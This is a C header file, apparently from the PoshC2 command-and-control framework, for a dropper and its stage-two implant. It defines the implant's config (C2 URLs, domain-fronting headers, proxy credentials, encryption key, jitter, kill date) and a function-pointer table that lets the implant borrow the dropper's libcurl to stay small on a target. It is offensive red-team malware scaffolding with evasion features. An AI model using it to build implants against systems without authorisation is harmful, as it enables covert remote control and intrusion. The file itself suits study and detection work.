#include <curl/curl.h>


// memory struct for passing to libcurl
struct memory {
	unsigned char *response;
	size_t size;
};

// definitions to handle config. This allows the config to be loaded by the dropper from memory in parse_config and then
// accessed in the stage2 using the defines below

struct config {
	const char *key;
	int urlid;
	const char *url_suffix2;
	const char *proxy_url;
	const char *proxy_user;
	const char *proxy_pass;
	const char *ua;

	int num_domain_headers;
	size_t max_domain_headers;
	const char **domain_front_headers;

	int num_servers;
	size_t max_servers;
	const char **serverclean;

	int num_urls;
	size_t max_urls;
	const char **urls;

	int num_icoimage;
	size_t max_icoimage;
	const char **icoimage;

	float jitter;
	int sleep_time;
	int kill_date;



};

#define POSH_KEY 0
#define POSH_URLID 1
#define POSH_URL_SUFFIX2 2
#define POSH_PROXY_URL 3
#define POSH_PROXY_USER 4
#define POSH_PROXY_PASS 5
#define POSH_UA 6
#define POSH_NUM_DOMAIN_HEADERS 7
#define POSH_DOMAIN_FRONT_HEADERS 8
#define POSH_NUM_SERVERS 9
#define POSH_SERVERCLEAN 10
#define POSH_NUM_URLS 11
#define POSH_URLS 12
#define POSH_NUM_ICOIMAGE 13
#define POSH_ICOIMAGE 14
#define POSH_JITTER 15
#define POSH_SLEEP_TIME 16
#define POSH_KILL_DATE 17

#define KEY (char *)GET_CONFIG_ITEM(config, POSH_KEY)
#define URLID *(int *)GET_CONFIG_ITEM(config, POSH_URLID)
#define URL_SUFFIX2 (char *)GET_CONFIG_ITEM(config, POSH_URL_SUFFIX2)
#define PROXY_URL (char *)GET_CONFIG_ITEM(config, POSH_PROXY_URL)
#define PROXY_USER (char *)GET_CONFIG_ITEM(config, POSH_PROXY_USER)
#define PROXY_PASS (char *)GET_CONFIG_ITEM(config, POSH_PROXY_PASS)
#define UA (char *)GET_CONFIG_ITEM(config, POSH_UA)
#define NUM_DOMAIN_HEADERS *(int *)GET_CONFIG_ITEM(config, POSH_NUM_DOMAIN_HEADERS)
#define DOMAIN_FRONT_HEADERS ((char **)GET_CONFIG_ITEM(config, POSH_DOMAIN_FRONT_HEADERS))
#define NUM_SERVERS *(int *)GET_CONFIG_ITEM(config, POSH_NUM_SERVERS)
#define SERVERCLEAN ((char **)(GET_CONFIG_ITEM(config, POSH_SERVERCLEAN)))
#define NUM_URLS *(int *)GET_CONFIG_ITEM(config, POSH_NUM_URLS)
#define URLS ((char **)GET_CONFIG_ITEM(config, POSH_URLS))
#define NUM_ICOIMAGE *(int *)GET_CONFIG_ITEM(config, POSH_NUM_ICOIMAGE)
#define ICOIMAGE ((unsigned char **)GET_CONFIG_ITEM(config, POSH_ICOIMAGE))
#define JITTER *(float *)GET_CONFIG_ITEM(config, POSH_JITTER)
#define SLEEP_TIME *(int *)GET_CONFIG_ITEM(config, POSH_SLEEP_TIME)
#define KILL_DATE *(int *)GET_CONFIG_ITEM(config, POSH_KILL_DATE)


extern size_t curl_cb(void *data, size_t size, size_t nmemb, void *userp);
extern unsigned char * _encrypt(const char *b64_key, char *data, size_t data_len, size_t *b64_output_len, int b64);
extern unsigned char * _decrypt(const char *b64_key, unsigned char *data, size_t data_len, size_t *pt_len);
extern void hexdump(char *identifier, unsigned char *ptr, int size);
extern int startswith(const char *str, char *prefix);
extern char *get_proxy(const char *proxy_url, const char *proxy_user, const char *proxy_pass);
extern const void *get_config_item(struct config *config, int config_key);
extern const void set_sleep_time(struct config *config, int sleep_time);

// if the DEBUG define is set, include printf output for debugging. If not set, then don't include the code/messages in the binary 
#ifdef DEBUG
	#define dprintf(fmt, ...) \
	    do { printf(fmt, __VA_ARGS__); } while (0);
#else
	#define dprintf(fmt, ...) \
	    do { } while (0);
#endif

// When we run our implant, it's a waste to have it linked against libcurl as you end up putting it onto the target twice, and it's reasonably large. 
// Therefore, construct an array of function pointers for the libcurl features we want to use, so that the implant can call back into the dropper rather than shipping it's own version of libcurl.
// generic function pointer we use to construct our array of pointers
typedef void (*generic_fp)(void);

// typedef each function we want to use so we can cast it back to the right type at use
typedef CURL* (*easy_init)(void);
typedef CURLcode (*setopt)(CURL *curl, CURLoption option, ...);
typedef CURLcode (*perform)(CURL *curl);
typedef void (*cleanup)(CURL *curl);
typedef void (*slist_free_all)(struct curl_slist *);
typedef struct curl_slist* (*slist_app)(struct curl_slist *, const char *);
typedef CURLcode (*global_init)(long flags);
typedef const void* (*_get_config_item)(struct config *config, int config_key);
typedef const void* (*_set_sleep_time)(struct config *config, int sleep_time);

// some defines, so we don't have to worry about getting it all right later on in the implant
#define CURL_EASY_INIT() ((easy_init)(*_func_table[0]))()
#define CURL_EASY_SETOPT(p1, p2, p3) ((setopt)(*_func_table[1]))(p1, p2, p3)
#define CURL_EASY_PERFORM(p1) ((perform)(*_func_table[2]))(p1)
#define CURL_EASY_CLEANUP(p1) ((cleanup)(*_func_table[3]))(p1)
#define CURL_SLIST_FREE_ALL(p1) ((slist_free_all)(*_func_table[4]))(p1)
#define CURL_SLIST_APPEND(p1, p2) ((slist_app)(*_func_table[5]))(p1, p2)
#define CURL_GLOBAL_INIT(p1) ((global_init)(*_func_table[6]))(p1)
#define GET_CONFIG_ITEM(p1, p2) ((_get_config_item)(*_func_table[7]))(p1, p2)
#define SET_SLEEP_TIME(p1, p2) ((_set_sleep_time)(*_func_table[8]))(p1, p2)
